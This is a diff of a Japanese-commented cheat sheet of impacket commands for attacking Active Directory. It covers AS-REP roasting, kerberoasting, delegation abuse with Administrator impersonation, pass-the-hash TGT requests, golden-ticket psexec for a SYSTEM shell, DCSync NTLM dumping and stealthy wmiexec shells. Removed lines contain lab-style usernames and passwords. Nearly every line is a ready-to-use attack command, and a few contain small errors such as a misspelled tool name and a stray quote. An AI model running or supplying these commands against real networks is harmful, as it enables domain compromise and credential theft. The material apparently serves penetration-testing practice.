@@ -13,8 +13,9 @@ impacket-GetNPUsers.py <domain name>/<user name>　#TGTを不正に入手でき�
 impacket-GetNPUsers <domain>/ -dc-ip <IP> -usersfile user.txt -format hashcat -outputfile hash.txt -no-pass #パスワード認証なしでハッシュの入手を試みる
 impacket-GetNPUsers -dc-ip <IP> -request -usersfile usernames.txt example.local/ #ケルベロスドメイン認証を必要としないユーザの表示
 
-findDelegation.py INLANEFREIGHT.LOCAL/carole.rose:jasmine
-getST.py -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator
+impacket-findDelegation EXAMPLE.LOCAL/<user>:<pass> #デレゲーションが有効になっているものの列挙
+
+impacket-getST -spn <spn> EXAMPLE.LOCAL/<user>:<pass>' -impersonate Administrator #STの発行
 
 impacket-GetUserSPNs <domain name>/<user>:<pass> #kerberoastingの対象の列挙
 impacket-GetUserSPNs <domain name>/<user>:<pass> -dc-ip <IP> -request #TGSを入手 -request-user <user> で特定のユーザに絞れる
@@ -28,7 +29,9 @@ export KRB5CCNAME=./Administrator.ccache #上記で生成したゴールデン�
 impakcet-psexec -k -no-pass <domain> #ゴールデンチケットを持っている場合systemのシェルを使える
 impacket-psexec <domain>/<user>:<pass>@<IP> #impacket版psexec　パスを知っている場合
 
-./secretsdump.py -just-dc-ntlm <user>@<domain> -outputfile <file name> #DCSyncがあるユーザで全員のNTLMをダンプ
+impacket-getTGT <domain>/'<user>' -hashes :<hash> -dc-ip dc01.example.local #TGTの発行
+
+impacket-secretsdump -just-dc-ntlm <user>@<domain> -outputfile <file name> #DCSyncがあるユーザで全員のNTLMをダンプ
 impacket-secretsdump <domain>/<user>:<pass>@<IP> #ドメイン情報からパスワードダンプ
 
 impacket-wmiexec <domain>/<user>:'<pass>'@<IP> #wmiを通じて半対話型のシェルをとる。psexecよりステルス。
